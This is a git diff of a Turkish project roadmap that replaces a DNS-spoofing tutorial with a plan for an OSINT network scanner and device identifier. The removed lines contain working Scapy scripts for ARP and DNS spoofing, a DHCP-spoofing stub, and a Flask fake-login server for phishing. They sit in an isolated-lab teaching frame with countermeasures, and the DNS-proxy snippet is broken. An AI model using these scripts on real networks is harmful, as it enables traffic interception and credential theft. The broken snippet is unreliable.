@@ -1,172 +1,116 @@
-# ROADMAP.md: Python ile DNS Spoofing Özelliklerini Geliştirme ve Test Etme
+# ROADMAP.md: Python ile OSINT Destekli Ağ Taraması ve Cihaz Analizi Geliştirme Rehberi
 
 ## Giriş
-Bu yol haritası, Kali Linux’ta bulunan DNS spoofing araçlarından (Ettercap, Dnsspoof, DNSChef, Bettercap, DDSpoof ve SET) esinlenerek, Python kullanılarak bu özelliklerin nasıl geliştirileceği ve test edileceğine dair detaylı bir rehber sunar. **Önemli Uyarı: Bu bilgiler yalnızca eğitim ve araştırma amaçlıdır. Yetkisiz kullanımı yasa dışı ve etik dışıdır. Herhangi bir ağda veya sistemde test yapmadan önce açık izin almanız zorunludur.**
+Bu yol haritası, Python programlama dili kullanılarak geliştirilen OSINT destekli ağ tarama ve cihaz analiz sisteminin nasıl yapılandırılacağını, geliştirileceğini ve test edileceğini detaylı olarak açıklar. Bu proje, ağdaki cihazları MAC adresi üzerinden tanımlayarak üretici bilgilerini OUI (Organizationally Unique Identifier) veritabanı ile eşleştirir, cihaz türünü tahmin eder ve cihazlara ait temel açık port bilgilerini tespit eder. 
 
-Bu rehber, DNS spoofing tekniklerini Python ile yeniden oluşturmayı, etik ve yasal sınırlar içinde kalarak kontrollü bir ortamda test etmeyi amaçlar.
+**Uyarı**: Bu yazılım yalnızca eğitim, laboratuvar ve test ortamlarında kullanılmalıdır. Yetkisiz ağlara karşı kullanımı etik dışı ve yasa dışıdır.
+
+## Amaç
+- Ağ üzerindeki cihazları ARP protokolü ile taramak.
+- MAC adreslerinden üreticiyi belirlemek (OUI).
+- OSINT teknikleriyle cihaz türünü tahmin etmek.
+- Ping atarak cihazın erişilebilirliğini kontrol etmek.
+- Belirli portlara tarama yaparak servis bilgileri elde etmek.
+- Sonuçları kullanıcı dostu bir GUI arayüzünde listelemek.
 
 ## Ön Koşullar
-- **Python 3.x**: Geliştirme için temel dil.
+- **Python 3.x**
 - **Kütüphaneler**:
-  - Scapy: Paket oluşturma ve ağ manipülasyonu için (`pip install scapy`).
-  - dnslib: DNS sunucusu oluşturmak için (`pip install dnslib`).
-  - Flask: Sahte web sunucusu için (`pip install flask`).
-- **Bilgi Gereksinimleri**:
-  - Python programlama temelleri.
-  - Ağ protokolleri (IP, ARP, DNS, DHCP) hakkında temel bilgi.
-  - Linux komut satırı kullanımı.
-- **Araçlar**: VirtualBox veya benzeri bir sanallaştırma yazılımı.
+  - `scapy`: Ağ paketleri oluşturma ve analiz → `pip install scapy`
+  - `socket`: Port taraması için
+  - `subprocess`, `platform`: Ping işlemleri için
+  - `customtkinter`: Modern kullanıcı arayüzü → `pip install customtkinter`
+  - `tkinter.ttk`: Tablo görünümü
+- **Veri Dosyası**:
+  - `oui.txt`: MAC üretici listesini içeren OUI veritabanı (IEEE kaynaklı)
 
 ## Test Ortamını Kurma
-Güvenli bir test ortamı oluşturmak için aşağıdaki adımları izleyin:
-1. **VirtualBox Kurulumu**: VirtualBox’ı indirin ve kurun.
-2. **Sanal Makineler (VM) Oluşturma**:
-   - **Saldırgan VM**: Kali Linux veya herhangi bir Linux dağıtımı.
-   - **Kurban VM**: Herhangi bir işletim sistemi (ör. Windows, Linux).
-3. **Ağ Yapılandırması**: VM’leri yalnızca dahili veya host-only bir ağda çalışacak şekilde ayarlayın. Bu, testlerin üretim ağlarından izole olmasını sağlar.
+1. **Sistem Gereksinimleri**:
+   - Python 3 yüklü bir Linux/Windows sistemi.
+   - Sudo yetkisine sahip kullanıcı (Scapy için gerekebilir).
 
-## Temel Bileşenlerin Geliştirilmesi
+2. **Ağ Yapısı**:
+   - Uygulama, yalnızca aynı yerel ağdaki cihazları tarar (örnek: `192.168.1.0/24`).
+   - Herhangi bir router ya da WiFi ağında kullanılabilir.
 
-### ARP Spoofing Betiği
-ARP spoofing, ortadaki adam (MITM) saldırıları için temel bir adımdır. Bu betik, saldırganın MAC adresini ağ geçidinin IP’siyle ilişkilendirmek için sahte ARP yanıtları gönderir.
 
-1. Scapy’yi kurun: `pip install scapy`
-2. IP yönlendirmeyi etkinleştirin: `sudo sysctl -w net.ipv4.ip_forward=1`
-3. ARP spoofing betiğini oluşturun:
 
+### MAC Adresinden Vendor Tespiti
 ```python
-from scapy.all import *
-import time
-
-def get_mac(ip):
-    ans, _ = arping(ip)
-    for s, r in ans:
-        return r[Ether].src
-
-def arp_spoof(target_ip, gateway_ip):
-    target_mac = get_mac(target_ip)
-    gateway_mac = get_mac(gateway_ip)
-    while True:
-        send(ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip), verbose=0)
-        send(ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip), verbose=0)
-        time.sleep(2)
-
-# Kullanım
-arp_spoof('192.168.1.10', '192.168.1.1')  # hedef_ip, ağ_geçidi_ip
+mac_prefix = mac.upper().replace("-", ":")[:8].lower()
+vendor = oui_veritabani.get(mac_prefix)
 ```
 
-### DNS Spoofing Betiği
-Bu betik, DNS sorgularını yakalar ve sahte yanıtlarla kurbanı yönlendirir.
-
-1. Scapy ile DNS spoofing betiğini yazın:
-
+### OSINT Tabanlı Cihaz Türü Tahmini
 ```python
-from scapy.all import *
-
-def dns_spoof(packet):
-    if packet.haslayer(DNSQR) and packet[DNS].qr == 0:
-        spoofed_ip = "192.168.1.100"  # Saldırganın IP’si
-        spoofed_packet = IP(dst=packet[IP].src, src=packet[IP].dst)/\
-                         UDP(dport=packet[UDP].sport, sport=53)/\
-                         DNS(id=packet[DNS].id, qr=1, aa=1, qd=packet[DNS].qd,
-                             an=DNSRR(name=packet[DNS].qd.qname, ttl=10, rdata=spoofed_ip))
-        send(spoofed_packet, verbose=0)
-
-sniff(filter="udp port 53", prn=dns_spoof)
+if "apple" in vendor: return "Telefon/Tablet"
+if "dell" in vendor: return "Bilgisayar"
+if "epson" in vendor: return "Yazıcı"
 ```
 
-### DHCP Manipülasyon Betiği
-Bu betik, sahte DHCP teklifleriyle istemcilere yanlış bir DNS sunucusu atar (DDSpoof benzeri).
-
-1. Scapy ile DHCP spoofing betiği:
-
+### Ping Cihaz Durumu Kontrolü
 ```python
-from scapy.all import *
-
-def dhcp_spoof(packet):
-    if packet.haslayer(DHCP) and packet[DHCP].options[0][1] == 1:  # Keşif (Discover)
-        fake_dns = "192.168.1.100"
-        # Sahte DHCP yanıtı oluşturma (detaylı paket yapılandırması gerekir)
-        # send(dhcp_offer)
-
-sniff(filter="udp and (port 67 or 68)", prn=dhcp_spoof)
+subprocess.run(["ping", "-c", "1", ip])
+```
+### Port Taraması
+```python
+for port in [80, 443, 22, 3389]:
+    socket.connect_ex((ip, port))
 ```
 
-### Sahte Web Sunucusu
-Kimlik avı veya sahte içerik sunmak için bir web sunucusu oluşturun.
+## Arayüz (GUI)
 
-1. Flask’ı kurun: `pip install flask`
-2. Basit bir Flask uygulaması yazın:
+- `CustomTkinter` kullanılarak kullanıcı dostu karanlık tema arayüzü tasarlandı.
+- Arayüz bileşenleri:
+  - IP aralığı giriş kutusu
+  - Tarama başlatma butonu
+  - İlerleme çubuğu
+  - Sonuçların listelendiği tablo
+- Gösterilen bilgiler:
+  - **IP Adresi**
+  - **MAC Adresi**
+  - **Marka (Vendor)**
+  - **Cihaz Türü**
+  - **Durum (Ping sonucu)**
+  - **Açık Portlar**
 
-```python
-from flask import Flask, render_template
-
-app = Flask(__name__)
-
-@app.route('/')
-def index():
-    return render_template('fake_login.html')
-
-if __name__ == '__main__':
-    app.run(host='0.0.0.0', port=80)
-```
-
-- `templates/fake_login.html` dosyası oluşturun (örneğin, bir giriş sayfası taklidi).
+---
 
 ## Gelişmiş Geliştirmeler
 
-### Seçmeli DNS Spoofing için DNS Proxy
-DNSChef gibi belirli alan adlarını spoof eden bir DNS sunucusu oluşturun.
+1. **Firmware OSINT Özelliği (Opsiyonel)**  
+   Tanımlanan markaya göre internette firmware dosyaları arayarak analiz için indirme bağlantıları sunulabilir.
 
-1. dnslib’i kurun: `pip install dnslib`
-2. DNS proxy betiği:
+2. **CVE Entegrasyonu (Opsiyonel)**  
+   Markaya göre CVE API (örneğin [NVD](https://nvd.nist.gov/)) kullanılarak bilinen güvenlik açıkları listelenebilir.
 
-```python
-from dnslib import *
-from dnslib.server import DNSServer, DNSHandler, BaseResolver
-import dns.resolv
+3. **Tarama Geçmişi Kaydı**  
+   Tarama sonuçları bir `results.csv` dosyasına yazılarak analiz ve karşılaştırma yapılabilir.
 
-class SpoofResolver(BaseResolver):
-    def resolve(self, request, handler):
-        reply = request.reply()
-        qname = str(request.q.qname)
-        if qname in ['example.com.']:
-            reply.add_answer(RR(qname, QTYPE.A, rdata=A('192.168.1.100'), ttl=60))
-        else:
-            # Gerçek DNS’e yönlendirme
-            reply = DNSRecord.parse(dns.resolv.Resolver().query(request.q.qname, request.q.qtype).send())
-        return reply
+4. **Gelişmiş Port Taraması**  
+   `nmap` benzeri bir yapı ile daha fazla port taranabilir, servis tanıma (banner grabbing) eklenebilir.
 
-resolver = SpoofResolver()
-server = DNSServer(resolver, port=53, address='0.0.0.0')
-server.start_thread()
-```
+---
 
-### Entegre MITM Betiği
-Bettercap benzeri bir betikle ARP ve DNS spoofing’i birleştirin.
+## Test Senaryoları
 
-1. Yukarıdaki ARP ve DNS spoofing kodlarını birleştirin.
-2. Yapılandırma dosyası veya komut satırı argümanlarıyla özelleştirin.
+- **Ağ Taraması**: IP aralığı girilir, cihazlar listelenmeli.
+- **MAC–Vendor Eşleşmesi**: Üretici doğru eşleşmeli.
+- **Cihaz Türü Tahmini**: Doğru sınıflandırma yapılmalı.
+- **Ping Testi**: Cevap veren cihazlar “Çevrimiçi” görünmeli.
+- **Port Tarama**: Açık portlar doğru listelenmeli.
 
-## Geliştirmelerin Test Edilmesi
-1. **ARP Spoofing**:
-   - Betiği çalıştırın.
-   - Kurban VM’de ARP tablosunu kontrol edin (`arp -a`); ağ geçidinin MAC adresi saldırganınkiyle değişmiş olmalı.
-2. **DNS Spoofing**:
-   - Betiği çalıştırın.
-   - Kurban VM’de bir alan adı çözümleyin (ör. `nslookup example.com`); sahte IP dönmeli.
-3. **DHCP Manipülasyonu**:
-   - Betiği çalıştırın.
-   - Kurban VM’de IP kirasını yenileyin (`ipconfig /renew` veya `dhclient`); DNS sunucusu sahte IP olmalı.
-4. **Sahte Web Sunucusu**:
-   - Kurban VM’den sahte domaine erişin; sahte sayfa görüntülenmeli.
+---
 
-## Karşı Önlemler ve En İyi Uygulamalar
-- **Statik ARP Girişleri**: ARP spoofing’i önler.
-- **DNSSEC**: DNS sorgularını doğrular.
-- **HTTPS Kullanımı**: Sertifika uyarılarına dikkat edin.
-- **VPN**: Trafiği şifreler ve yerel manipülasyonları engeller.
-- **İzole Test Ortamı**: Üretim ağlarında test yapmayın.
+## Güvenlik ve Etik Önlemler
+
+- Yalnızca kendi ağınızda kullanın.
+- Üçüncü kişilere ait cihazları izinsiz taramayın.
+- Tarama yükünü düşük tutun.
+- Veriler kaydediliyorsa güvenli bir şekilde saklanmalıdır.
+
+---
 
 ## Sonuç
-Bu yol haritası, Python ile DNS spoofing özelliklerini geliştirmeyi ve test etmeyi adım adım açıklamıştır. Etik ve yasal sorumluluklara bağlı kalarak, bu bilgileri siber güvenliği güçlendirmek için kullanmaya devam edin.
+
+Bu yol haritası, Python ve OSINT teknikleri kullanılarak geliştirilen ağ tarama uygulamasının tüm yapı taşlarını kapsamlı bir şekilde açıklamıştır. Eğitim, araştırma ve laboratuvar testleri için ideal olan bu proje, siber güvenlik, cihaz tanıma ve ağ analiz konularında pratik bilgi sağlar. Gerçek dünyada kullanılmadan önce yasal ve etik çerçevede test edilmelidir.
